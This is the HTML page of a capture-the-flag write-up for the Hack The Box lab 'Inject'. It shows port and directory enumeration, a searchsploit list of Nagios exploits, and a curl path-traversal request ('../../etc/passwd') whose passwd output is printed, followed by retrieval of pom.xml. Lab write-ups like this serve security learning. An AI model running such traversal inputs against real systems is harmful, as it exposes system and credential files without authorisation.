<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=Content-Security-Policy content="upgrade-insecure-requests; block-all-mixed-content; default-src 'self'; child-src 'self'; font-src 'self'; form-action 'self'; frame-src 'self'; img-src 'self' data: https://*.google-analytics.com https://*.googletagmanager.com; object-src 'none'; style-src 'self' 'unsafe-inline'; script-src 'self' 'unsafe-inline' https://*.googletagmanager.com; prefetch-src 'self'; connect-src 'self' https://*.google-analytics.com https://*.analytics.google.com https://*.googletagmanager.com"><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>HTB Writeup: Inject | woadey</title>
<meta name=keywords content="htb,hackthebox,inject,writeup"><meta name=description content="Writeup for Hack The Box – Inject"><meta name=author content><link rel=canonical href=https://woadey.xyz/posts/htb/easy/inject/><link crossorigin=anonymous href=/assets/css/stylesheet.e76b59a14721d0cb564e08439ed17c421e12b5639ca65079070ec645ce8a18ba.css integrity="sha256-52tZoUch0MtWTghDntF8Qh4StWOcplB5Bw7GRc6KGLo=" rel="preload stylesheet" as=style><link rel=icon href=https://woadey.xyz/favicon/pink_trans_bg/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://woadey.xyz/favicon/pink_trans_bg/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://woadey.xyz/favicon/pink_trans_bg/favicon-32x32.png><link rel=apple-touch-icon href=https://woadey.xyz/favicon/white_pink_bg/apple-touch-icon.png><link rel=mask-icon href=https://woadey.xyz/favicon/pink_trans_bg/favicon.ico><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://woadey.xyz/posts/htb/easy/inject/><noscript><style>#theme-toggle,.top-link{display:none}</style></noscript><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-9703667233476494" crossorigin=anonymous></script><script async src="https://www.googletagmanager.com/gtag/js?id=G-EF924K1NXR"></script><script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-EF924K1NXR",{anonymize_ip:!1})}</script><meta property="og:title" content="HTB Writeup: Inject"><meta property="og:description" content="Writeup for Hack The Box – Inject"><meta property="og:type" content="article"><meta property="og:url" content="https://woadey.xyz/posts/htb/easy/inject/"><meta property="og:image" content="https://woadey.xyz/posts/htb/easy/inject/images/Inject.png"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-03-20T22:39:05-04:00"><meta property="article:modified_time" content="2023-03-20T22:39:05-04:00"><meta property="og:site_name" content="woadey's blog"><meta name=twitter:title content="HTB Writeup: Inject"><meta name=twitter:description content="Writeup for Hack The Box – Inject"><meta name=twitter:site content="@woadey_"><meta name=twitter:card content="summary"><meta name=twitter:image content="https://woadey.xyz/posts/htb/easy/inject/images/Inject.png"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"posts","item":"https://woadey.xyz/posts/"},{"@type":"ListItem","position":2,"name":"HTB Writeup: Inject","item":"https://woadey.xyz/posts/htb/easy/inject/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"HTB Writeup: Inject","name":"HTB Writeup: Inject","description":"Writeup for Hack The Box – Inject","keywords":["htb","hackthebox","inject","writeup"],"articleBody":"nmap 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 # Nmap 7.92 scan initiated Mon Mar 20 22:37:54 2023 as: nmap -sC -sV -oA nmap/inject -T4 10.10.11.204 Nmap scan report for 10.10.11.204 Host is up (0.029s latency). Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 ca:f1:0c:51:5a:59:62:77:f0:a8:0c:5c:7c:8d:da:f8 (RSA) | 256 d5:1c:81:c9:7b:07:6b:1c:c1:b4:29:25:4b:52:21:9f (ECDSA) |_ 256 db:1d:8c:eb:94:72:b0:d3:ed:44:b9:6c:93:a7:f9:1d (ED25519) 8080/tcp open nagios-nsca Nagios NSCA |_http-title: Home Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Mon Mar 20 22:38:05 2023 -- 1 IP address (1 host up) scanned in 10.33 seconds gobuster gobuster dir -u http://10.10.11.204:8080 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -o gobuster .out -z 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 =============================================================== Gobuster v3.2.0-dev by OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.11.204:8080 [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.2.0-dev [+] Timeout: 10s =============================================================== 2023/03/20 23:20:09 Starting gobuster in directory enumeration mode =============================================================== /upload (Status: 200) [Size: 1857] /blogs (Status: 200) [Size: 5371] /register (Status: 200) [Size: 5654] /error (Status: 500) [Size: 106] =============================================================== 2023/03/20 23:20:56 Finished =============================================================== searchsploit After a bit of trial and error, I discovered that the /upload page only accepts file extensions related to images. I attempted to upload malicious image files containing a PHP reverse shell, but this failed. Then I started to look and see if any of the programs running on the open ports were vulnerable with metasploit’s searchsploit CLI tool that allows users to search through known vulnerabilities within the Exploit Database.\n------------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path ------------------------------------------------------------------------------------------- --------------------------------- Nagios 3.0.6 - 'statuswml.cgi' Arbitrary Shell Command Injection | cgi/remote/33051.txt Nagios 3.2.3 - 'expand' Cross-Site Scripting | multiple/remote/35818.txt Nagios 4.2.2 - Local Privilege Escalation | linux/local/40774.sh Nagios \u003c 4.2.2 - Arbitrary Code Execution | linux/remote/40920.py Nagios \u003c 4.2.4 - Local Privilege Escalation | linux/local/40921.sh Nagios Core 4.4.1 - Denial of Service | linux/dos/45082.txt Nagios Incident Manager 2.0.0 - Multiple Vulnerabilities | php/webapps/40252.txt Nagios Log Server 1.4.1 - Multiple Vulnerabilities | php/webapps/40250.txt Nagios Log Server 2.1.6 - Persistent Cross-Site Scripting | multiple/webapps/48772.txt Nagios Log Server 2.1.7 - Persistent Cross-Site Scripting | multiple/webapps/49082.txt Nagios Network Analyzer 2.2.0 - Multiple Vulnerabilities | php/webapps/40251.txt Nagios Network Analyzer 2.2.1 - Multiple Cross-Site Request Forgery Vulnerabilities | php/webapps/40221.txt Nagios Plugins 1.4.2/1.4.9 - Location Header Remote Buffer Overflow | linux/dos/30646.txt Nagios Plugins check_dhcp 2.0.1 - Arbitrary Option File Read | linux/local/33387.txt Nagios Plugins check_dhcp 2.0.2 - Arbitrary Option File Read Race Condition | linux/local/33904.txt Nagios Plugins check_ups - Local Buffer Overflow (PoC) | linux/dos/18278.txt Nagios Remote Plugin Executor - Arbitrary Command Execution (Metasploit) | linux/remote/24955.rb Nagios XI - 'login.php' Multiple Cross-Site Scripting Vulnerabilities | linux/remote/34507.txt Nagios XI - 'tfPassword' SQL Injection | php/remote/38827.txt Nagios XI - 'users.php' SQL Injection | multiple/remote/34523.txt Nagios XI - Authenticated Remote Command Execution (Metasploit) | linux/remote/48191.rb Nagios XI - Multiple Cross-Site Request Forgery Vulnerabilities | linux/remote/34431.html Nagios XI - Multiple Cross-Site Scripting / HTML Injection Vulnerabilities | multiple/remote/36455.txt Nagios XI 5.2.6 \u003c 5.2.9 / 5.3 / 5.4 - Chained Remote Root | php/webapps/44560.py Nagios XI 5.2.6-5.4.12 - Chained Remote Code Execution (Metasploit) | linux/remote/44969.rb Nagios XI 5.2.7 - Multiple Vulnerabilities | php/webapps/39899.txt Nagios XI 5.5.6 - Magpie_debug.php Root Remote Code Execution (Metasploit) | linux/remote/47039.rb Nagios XI 5.5.6 - Remote Code Execution / Privilege Escalation | linux/webapps/46221.py Nagios XI 5.6.1 - SQL injection | php/webapps/46910.txt Nagios XI 5.6.12 - 'export-rrd.php' Remote Code Execution | php/webapps/48640.txt Nagios XI 5.6.5 - Remote Code Execution / Root Privilege Escalation | php/webapps/47299.php Nagios XI 5.7.3 - 'Contact Templates' Persistent Cross-Site Scripting | php/webapps/48893.txt Nagios XI 5.7.3 - 'Manage Users' Authenticated SQL Injection | php/webapps/48894.txt Nagios XI 5.7.3 - 'mibs.php' Remote Command Injection (Authenticated) | php/webapps/48959.py Nagios XI 5.7.3 - 'SNMP Trap Interface' Authenticated SQL Injection | php/webapps/48895.txt Nagios XI 5.7.5 - Multiple Persistent Cross-Site Scripting | php/webapps/49449.txt Nagios XI 5.7.X - Remote Code Execution RCE (Authenticated) | php/webapps/49422.py Nagios XI Chained - Remote Code Execution (Metasploit) | linux/remote/40067.rb Nagios XI Network Monitor Graph Explorer Component - Command Injection (Metasploit) | unix/remote/23227.rb Nagios3 - 'history.cgi' Host Command Execution (Metasploit) | linux/remote/24159.rb Nagios3 - 'history.cgi' Remote Command Execution | multiple/remote/24084.py Nagios3 - 'statuswml.cgi' 'Ping' Command Execution (Metasploit) | cgi/webapps/16908.rb Nagios3 - 'statuswml.cgi' Command Injection (Metasploit) | unix/webapps/9861.rb NagiosQL 2005 2.00 - 'prepend_adm.php' Remote File Inclusion | php/webapps/3919.txt PHPNagios 1.2.0 - 'menu.php' Local File Inclusion | php/webapps/9611.txt ------------------------------------------------------------------------------------------- --------------------------------- Shellcodes: No Results Nothing proved useful here.\nburpsuite I then started using burpsuite to see if anything weird was happening with the requests. Eventually, I realized that the query string (or URL parameter) was passing in the desired file. But can we specify any file? Seemed like a path traversal vulnerability could be present.\ncurl I then switched over to curl so I could perform this path injection from my terminal. First, I tested to see what would happen with my PHP reverse shell “image.”\n┌──(kali㉿kali)-[~/htb/inject] └─$ curl \"http://10.10.11.204:8080/show_image?img=shell.png\" {\"timestamp\":\"2023-03-21T03:37:17.652+00:00\",\"status\":500,\"error\":\"Internal Server Error\",\"message\":\"URL [file:/var/www/WebApp/src/main/uploads/shell.png] cannot be resolved in the file system for checking its content length\",\"path\":\"/show_image\"} Right away, we can see the path to this file is output. Now let’s try with something a little more spicy.\n┌──(kali㉿kali)-[~/htb/inject] └─$ curl \"http://10.10.11.204:8080/show_image?img=../../../../../../etc/passwd\" root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin pollinate:x:110:1::/var/cache/pollinate:/bin/false usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin frank:x:1000:1000:frank:/home/frank:/bin/bash lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false sshd:x:113:65534::/run/sshd:/usr/sbin/nologin phil:x:1001:1001::/home/phil:/bin/bash fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin _laurel:x:997:996::/var/log/laurel:/bin/false Some digging later, I found this interesting configuration file.\ncurl \"http://10.10.11.204:8080/show_image?img=../../../../../www/WebApp/pom.xml\" \u003e pom.xml file: pom.xml\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 \u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e ","wordCount":"1680","inLanguage":"en","image":"https://woadey.xyz/images/Inject.png","datePublished":"2023-03-20T22:39:05-04:00","dateModified":"2023-03-20T22:39:05-04:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://woadey.xyz/posts/htb/easy/inject/"},"publisher":{"@type":"Organization","name":"woadey","logo":{"@type":"ImageObject","url":"https://woadey.xyz/favicon/pink_trans_bg/favicon.ico"}}}</script></head><body class=dark id=top><script>localStorage.getItem("pref-theme")==="light"&&document.body.classList.remove("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://woadey.xyz/ accesskey=h title="oadey (Alt + H)"><img src=/images/pink.jpeg srcset="/images/pink_hu5661c188f24668226bb80c6208008ab1_117796_0x32_resize_q75_h2_box.webp 32w, /images/pink_hu5661c188f24668226bb80c6208008ab1_117796_64x0_resize_q75_h2_box.webp 120w" sizes=32px height=32 width=32 alt=logo aria-label=logo>
oadey</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button><ul class=lang-switch><li>|</li></ul></div></div><ul id=menu><li><a href=https://woadey.xyz/posts/ title=posts><span>posts</span></a></li><li><a href=https://woadey.xyz/categories/ title=categories><span>categories</span></a></li><li><a href=https://woadey.xyz/tags/ title=tags><span>tags</span></a></li><li><a href=https://woadey.xyz/archives/ title=archives><span>archives</span></a></li><li><a href=https://woadey.xyz/search/ title="search (Alt + /)" accesskey=/><span>search</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://woadey.xyz/>home</a>&nbsp;»&nbsp;<a href=https://woadey.xyz/posts/>posts</a></div><h1 class=post-title>HTB Writeup: Inject</h1><div class=post-description>Writeup for Hack The Box – <a href=https://app.hackthebox.com/machines/533 title=Inject target=_blank rel="nofollow noopener">Inject</a></div><div class=post-meta><span title='2023-03-20 22:39:05 -0400 -0400'>March 20, 2023</span>&nbsp;·&nbsp;8 min</div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><ul><li><a href=#nmap>nmap</a></li><li><a href=#gobuster>gobuster</a></li><li><a href=#searchsploit>searchsploit</a></li><li><a href=#burpsuite>burpsuite</a></li><li><a href=#curl>curl</a></li><li><a href=#searchsploit-1>searchsploit</a></li><li><a href=#flags>Flags</a></li></ul></li></ul></nav></div></details></div><div class=post-content><h3 id=nmap>nmap<a hidden class=anchor aria-hidden=true href=#nmap>#</a></h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl><span class=c1># Nmap 7.92 scan initiated Mon Mar 20 22:37:54 2023 as: nmap -sC -sV -oA nmap/inject -T4 10.10.11.204</span>
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.10.11.204
</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.029s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>Not shown: <span class=m>998</span> closed tcp ports <span class=o>(</span>reset<span class=o>)</span>
</span></span><span class=line><span class=cl>PORT     STATE SERVICE     VERSION
</span></span><span class=line><span class=cl>22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 <span class=o>(</span>Ubuntu Linux<span class=p>;</span> protocol 2.0<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span> ssh-hostkey:
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>3072</span> ca:f1:0c:51:5a:59:62:77:f0:a8:0c:5c:7c:8d:da:f8 <span class=o>(</span>RSA<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>256</span> d5:1c:81:c9:7b:07:6b:1c:c1:b4:29:25:4b:52:21:9f <span class=o>(</span>ECDSA<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_  <span class=m>256</span> db:1d:8c:eb:94:72:b0:d3:ed:44:b9:6c:93:a7:f9:1d <span class=o>(</span>ED25519<span class=o>)</span>
</span></span><span class=line><span class=cl>8080/tcp open  nagios-nsca Nagios NSCA
</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: Home
</span></span><span class=line><span class=cl>Service Info: OS: Linux<span class=p>;</span> CPE: cpe:/o:linux:linux_kernel
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class=line><span class=cl><span class=c1># Nmap done at Mon Mar 20 22:38:05 2023 -- 1 IP address (1 host up) scanned in 10.33 seconds</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=gobuster>gobuster<a hidden class=anchor aria-hidden=true href=#gobuster>#</a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>gobuster dir -u http://10.10.11.204:8080 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -o gobuster
</span></span><span class=line><span class=cl>.out -z
</span></span></code></pre></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl>Gobuster v3.2.0-dev
</span></span><span class=line><span class=cl>by OJ Reeves <span class=o>(</span>@TheColonial<span class=o>)</span> <span class=p>&amp;</span> Christian Mehlmauer <span class=o>(</span>@firefart<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Url:                     http://10.10.11.204:8080
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Method:                  GET
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Threads:                 <span class=m>10</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Wordlist:                /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Negative Status codes:   <span class=m>404</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> User Agent:              gobuster/3.2.0-dev
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Timeout:                 <span class=nv>10s</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl>2023/03/20 23:20:09 Starting gobuster in directory enumeration <span class=nv>mode</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl>/upload               <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 1857<span class=o>]</span>
</span></span><span class=line><span class=cl>/blogs                <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 5371<span class=o>]</span>
</span></span><span class=line><span class=cl>/register             <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 5654<span class=o>]</span>
</span></span><span class=line><span class=cl>/error                <span class=o>(</span>Status: 500<span class=o>)</span> <span class=o>[</span>Size: 106<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl>2023/03/20 23:20:56 <span class=nv>Finished</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=searchsploit>searchsploit<a hidden class=anchor aria-hidden=true href=#searchsploit>#</a></h3><p>After a bit of trial and error, I discovered that the <code>/upload</code> page only accepts file extensions related to images. I attempted to upload malicious image files containing a PHP reverse shell, but this failed. Then I started to look and see if any of the programs running on the open ports were vulnerable with <code>metasploit</code>&rsquo;s <code>searchsploit</code> CLI tool that allows users to search through known vulnerabilities within the Exploit Database.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>------------------------------------------------------------------------------------------- ---------------------------------
</span></span><span class=line><span class=cl> Exploit Title                                                                             <span class=p>|</span>  Path
</span></span><span class=line><span class=cl>------------------------------------------------------------------------------------------- ---------------------------------
</span></span><span class=line><span class=cl>Nagios 3.0.6 - <span class=s1>&#39;statuswml.cgi&#39;</span> Arbitrary Shell Command Injection                           <span class=p>|</span> cgi/remote/33051.txt
</span></span><span class=line><span class=cl>Nagios 3.2.3 - <span class=s1>&#39;expand&#39;</span> Cross-Site Scripting                                               <span class=p>|</span> multiple/remote/35818.txt
</span></span><span class=line><span class=cl>Nagios 4.2.2 - Local Privilege Escalation                                                  <span class=p>|</span> linux/local/40774.sh
</span></span><span class=line><span class=cl>Nagios &lt; 4.2.2 - Arbitrary Code Execution                                                  <span class=p>|</span> linux/remote/40920.py
</span></span><span class=line><span class=cl>Nagios &lt; 4.2.4 - Local Privilege Escalation                                                <span class=p>|</span> linux/local/40921.sh
</span></span><span class=line><span class=cl>Nagios Core 4.4.1 - Denial of Service                                                      <span class=p>|</span> linux/dos/45082.txt
</span></span><span class=line><span class=cl>Nagios Incident Manager 2.0.0 - Multiple Vulnerabilities                                   <span class=p>|</span> php/webapps/40252.txt
</span></span><span class=line><span class=cl>Nagios Log Server 1.4.1 - Multiple Vulnerabilities                                         <span class=p>|</span> php/webapps/40250.txt
</span></span><span class=line><span class=cl>Nagios Log Server 2.1.6 - Persistent Cross-Site Scripting                                  <span class=p>|</span> multiple/webapps/48772.txt
</span></span><span class=line><span class=cl>Nagios Log Server 2.1.7 - Persistent Cross-Site Scripting                                  <span class=p>|</span> multiple/webapps/49082.txt
</span></span><span class=line><span class=cl>Nagios Network Analyzer 2.2.0 - Multiple Vulnerabilities                                   <span class=p>|</span> php/webapps/40251.txt
</span></span><span class=line><span class=cl>Nagios Network Analyzer 2.2.1 - Multiple Cross-Site Request Forgery Vulnerabilities        <span class=p>|</span> php/webapps/40221.txt
</span></span><span class=line><span class=cl>Nagios Plugins 1.4.2/1.4.9 - Location Header Remote Buffer Overflow                        <span class=p>|</span> linux/dos/30646.txt
</span></span><span class=line><span class=cl>Nagios Plugins check_dhcp 2.0.1 - Arbitrary Option File Read                               <span class=p>|</span> linux/local/33387.txt
</span></span><span class=line><span class=cl>Nagios Plugins check_dhcp 2.0.2 - Arbitrary Option File Read Race Condition                <span class=p>|</span> linux/local/33904.txt
</span></span><span class=line><span class=cl>Nagios Plugins check_ups - Local Buffer Overflow <span class=o>(</span>PoC<span class=o>)</span>                                     <span class=p>|</span> linux/dos/18278.txt
</span></span><span class=line><span class=cl>Nagios Remote Plugin Executor - Arbitrary Command Execution <span class=o>(</span>Metasploit<span class=o>)</span>                   <span class=p>|</span> linux/remote/24955.rb
</span></span><span class=line><span class=cl>Nagios XI - <span class=s1>&#39;login.php&#39;</span> Multiple Cross-Site Scripting Vulnerabilities                      <span class=p>|</span> linux/remote/34507.txt
</span></span><span class=line><span class=cl>Nagios XI - <span class=s1>&#39;tfPassword&#39;</span> SQL Injection                                                     <span class=p>|</span> php/remote/38827.txt
</span></span><span class=line><span class=cl>Nagios XI - <span class=s1>&#39;users.php&#39;</span> SQL Injection                                                      <span class=p>|</span> multiple/remote/34523.txt
</span></span><span class=line><span class=cl>Nagios XI - Authenticated Remote Command Execution <span class=o>(</span>Metasploit<span class=o>)</span>                            <span class=p>|</span> linux/remote/48191.rb
</span></span><span class=line><span class=cl>Nagios XI - Multiple Cross-Site Request Forgery Vulnerabilities                            <span class=p>|</span> linux/remote/34431.html
</span></span><span class=line><span class=cl>Nagios XI - Multiple Cross-Site Scripting / HTML Injection Vulnerabilities                 <span class=p>|</span> multiple/remote/36455.txt
</span></span><span class=line><span class=cl>Nagios XI 5.2.6 &lt; 5.2.9 / 5.3 / 5.4 - Chained Remote Root                                  <span class=p>|</span> php/webapps/44560.py
</span></span><span class=line><span class=cl>Nagios XI 5.2.6-5.4.12 - Chained Remote Code Execution <span class=o>(</span>Metasploit<span class=o>)</span>                        <span class=p>|</span> linux/remote/44969.rb
</span></span><span class=line><span class=cl>Nagios XI 5.2.7 - Multiple Vulnerabilities                                                 <span class=p>|</span> php/webapps/39899.txt
</span></span><span class=line><span class=cl>Nagios XI 5.5.6 - Magpie_debug.php Root Remote Code Execution <span class=o>(</span>Metasploit<span class=o>)</span>                 <span class=p>|</span> linux/remote/47039.rb
</span></span><span class=line><span class=cl>Nagios XI 5.5.6 - Remote Code Execution / Privilege Escalation                             <span class=p>|</span> linux/webapps/46221.py
</span></span><span class=line><span class=cl>Nagios XI 5.6.1 - SQL injection                                                            <span class=p>|</span> php/webapps/46910.txt
</span></span><span class=line><span class=cl>Nagios XI 5.6.12 - <span class=s1>&#39;export-rrd.php&#39;</span> Remote Code Execution                                  <span class=p>|</span> php/webapps/48640.txt
</span></span><span class=line><span class=cl>Nagios XI 5.6.5 - Remote Code Execution / Root Privilege Escalation                        <span class=p>|</span> php/webapps/47299.php
</span></span><span class=line><span class=cl>Nagios XI 5.7.3 - <span class=s1>&#39;Contact Templates&#39;</span> Persistent Cross-Site Scripting                      <span class=p>|</span> php/webapps/48893.txt
</span></span><span class=line><span class=cl>Nagios XI 5.7.3 - <span class=s1>&#39;Manage Users&#39;</span> Authenticated SQL Injection                               <span class=p>|</span> php/webapps/48894.txt
</span></span><span class=line><span class=cl>Nagios XI 5.7.3 - <span class=s1>&#39;mibs.php&#39;</span> Remote Command Injection <span class=o>(</span>Authenticated<span class=o>)</span>                      <span class=p>|</span> php/webapps/48959.py
</span></span><span class=line><span class=cl>Nagios XI 5.7.3 - <span class=s1>&#39;SNMP Trap Interface&#39;</span> Authenticated SQL Injection                        <span class=p>|</span> php/webapps/48895.txt
</span></span><span class=line><span class=cl>Nagios XI 5.7.5 - Multiple Persistent Cross-Site Scripting                                 <span class=p>|</span> php/webapps/49449.txt
</span></span><span class=line><span class=cl>Nagios XI 5.7.X - Remote Code Execution RCE <span class=o>(</span>Authenticated<span class=o>)</span>                                <span class=p>|</span> php/webapps/49422.py
</span></span><span class=line><span class=cl>Nagios XI Chained - Remote Code Execution <span class=o>(</span>Metasploit<span class=o>)</span>                                     <span class=p>|</span> linux/remote/40067.rb
</span></span><span class=line><span class=cl>Nagios XI Network Monitor Graph Explorer Component - Command Injection <span class=o>(</span>Metasploit<span class=o>)</span>        <span class=p>|</span> unix/remote/23227.rb
</span></span><span class=line><span class=cl>Nagios3 - <span class=s1>&#39;history.cgi&#39;</span> Host Command Execution <span class=o>(</span>Metasploit<span class=o>)</span>                                <span class=p>|</span> linux/remote/24159.rb
